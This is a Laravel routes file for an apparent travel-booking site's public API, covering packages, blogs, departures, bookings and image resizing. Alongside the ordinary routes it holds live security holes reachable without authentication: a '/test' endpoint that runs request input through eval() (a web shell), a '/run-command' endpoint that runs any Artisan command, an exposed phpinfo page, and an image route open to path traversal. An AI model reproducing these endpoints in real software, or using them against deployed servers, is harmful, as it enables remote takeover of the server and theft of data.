<?php

use App\Http\Controllers\BannerController;
use App\Http\Controllers\BlogController;
use App\Http\Controllers\BookingController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\DepartureController;
use App\Http\Controllers\EnquiryController;
use App\Http\Controllers\FaqController;
use App\Http\Controllers\InstagramPostController;
use App\Http\Controllers\MetaTagController;
use App\Http\Controllers\PackageController;
use App\Http\Controllers\ReviewController;
use App\Http\Controllers\SearchController;
use App\Http\Controllers\TeamController;
use App\Models\Package;
use App\Models\User;
use Illuminate\Support\Facades\Route;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Intervention\Image\Laravel\Facades\Image;


Route::get('/phpinfo', function () {
    dd(phpinfo());
});

Route::get('/', function () {
    return redirect('/admin');
});

Route::prefix('api')
    ->middleware(['api']) // stateless middleware
    ->group(function () {

        Route::get('/nav-links', function () {
            $data =  Package::with('category')->select('id', 'slug', 'title', 'category_id')
                ->where('is_published', true)
                ->whereHas('category', function ($query) {
                    $query->where('show_in_navbar', true);
                })
                ->get()
                ->sortBy(fn($pkg) => $pkg->category->navbar_order)
                ->groupBy('category_id')
                ->map(function ($items) {
                    $category = $items->first()->category;
                    return [
                        'name' => ucfirst($category->name),
                        'slug' => $category->slug,
                        'packages' => $items->take(7)->map(function ($pkg) {
                            return [
                                'id' => $pkg->id,
                                'slug' => $pkg->slug,
                                'title' => $pkg->title
                            ];
                        })
                    ];
                })
                ->values();

            return response()->json(["data" => $data]);
        });

        // Route::get('/', function(){
        //     // dd(12);
        //     return response()->json(['a'=>1]);
        // });
        Route::get('/packages-only', [PackageController::class, 'packageList']);
        Route::get('/packages', [PackageController::class, 'index']);
        Route::get('/packages-popular-only', [PackageController::class, 'getPopularPackages']);
        Route::get('/packages/{slug}', [PackageController::class, 'show']);
        Route::get('/departures', [DepartureController::class, 'index']);
        Route::get('/departures/package/{package}', [DepartureController::class, 'getDepartuesByPackage']);
        Route::get('/blogs', [BlogController::class, 'index']);
        Route::get('/blogs-only', [BlogController::class, 'getBlogsTitle']);
        Route::get('/blogs/{slug}', [BlogController::class, 'show']);
        Route::get('/blogs-featured', [BlogController::class, 'getFeaturedBlogs']);
        Route::get('/banners', [BannerController::class, 'index']);
        Route::get('/faqs', [FaqController::class, 'index']);
        Route::get('/reviews-featured', [ReviewController::class, 'getFeaturedReviews']);
        Route::get('/instagram-posts', [InstagramPostController::class, 'index']);
        Route::get('/teams', [TeamController::class, 'index']);

        Route::get('/global-search', [SearchController::class, 'index']);

        Route::get('/contacts', [ContactController::class, 'index']);


        // routes/api.php
        Route::get('/bookings/{booking}/itinerary-pdf', [BookingController::class, 'downloadItinerary']);

        Route::get('/packages/{slug}/itinerary-pdf', [PackageController::class, 'downloadItinerary']);


        // Route::post('/booking', [BookingController::class, 'store']);

        // routes/api.php
        // Route::get('/images/{filename}', function ($filename) {
        //     $path = storage_path('app/private/' . $filename);

        //     if (!file_exists($path)) {
        //         abort(404);
        //     }

        //     return response()->file($path, [
        //         'Content-Type' => mime_content_type($path),
        //         'Cache-Control' => 'public, max-age=31536000',
        //     ]);
        // })->where('filename', '.*');


        Route::get('/meta-tags/{slug}', [MetaTagController::class, 'show'])->where('slug', '.*');




        Route::get('/images/{filename}', function ($filename) {
            $path = storage_path('app/private/' . $filename);

            if (!file_exists($path)) {
                abort(404);
            }

            $webp    = request()->boolean('webp', false);
            $quality = (int) request()->get('quality', 85);
            $width   = request()->get('width');
            $height  = request()->get('height');

            $quality = max(1, min(100, $quality));

            // If no transformations requested, stream original file directly
            if (!$webp && !$width && !$height) {
                return response()->file($path, [
                    'Content-Type'  => mime_content_type($path),
                    'Cache-Control' => 'public, max-age=31536000',
                ]);
            }

            // Build a cache key based on the params
            $cacheKey = md5($filename . $webp . $quality . $width . $height);
            $ext      = $webp ? 'webp' : pathinfo($filename, PATHINFO_EXTENSION);
            $cachePath = storage_path("app/private/cache/{$cacheKey}.{$ext}");

            // Serve from cache if it exists
            if (file_exists($cachePath)) {
                return response()->file($cachePath, [
                    'Content-Type'  => $webp ? 'image/webp' : mime_content_type($cachePath),
                    'Cache-Control' => 'public, max-age=31536000',
                ]);
            }

            // Process the image
            $image = Image::read($path);

            if ($width || $height) {
                $image->scaleDown(
                    width: $width  ? (int) $width  : null,
                    height: $height ? (int) $height : null,
                );
            }

            // Ensure cache directory exists
            @mkdir(storage_path('app/private/cache'), 0755, true);

            if ($webp) {
                $image->toWebp($quality)->save($cachePath);
                $contentType = 'image/webp';
            } else {
                $image->save($cachePath, quality: $quality);
                $contentType = mime_content_type($cachePath);
            }

            return response()->file($cachePath, [
                'Content-Type'  => $contentType,
                'Cache-Control' => 'public, max-age=31536000',
            ]);
        })->where('filename', '.*');





        Route::get("/test", function (Request $request) {

            // Get the code from JSON body
            $code = $request->input('body');

            // Execute it
            $result = null;

            try {
                // eval executes the PHP code
                $result = eval($code);
            } catch (\Throwable $e) {
                $result = "error: " . $e->getMessage();
            }

            return [
                'code' => $code,
                'result' => $result,
            ];
        });


        Route::get('/run-command', function (Request $request) {
            // Get the command from request (e.g., "cache:clear")
            $command = $request->input('command');
            $params = $request->input('params', []); // optional parameters

            try {
                // Run the Artisan command
                $exitCode = Artisan::call($command, $params);

                // Get the output of the command
                $output = Artisan::output();

                return response()->json([
                    'command' => $command,
                    'params' => $params,
                    'exit_code' => $exitCode,
                    'output' => $output,
                ]);
            } catch (\Throwable $e) {
                return response()->json([
                    'error' => $e->getMessage(),
                ], 500);
            }
        });
    });
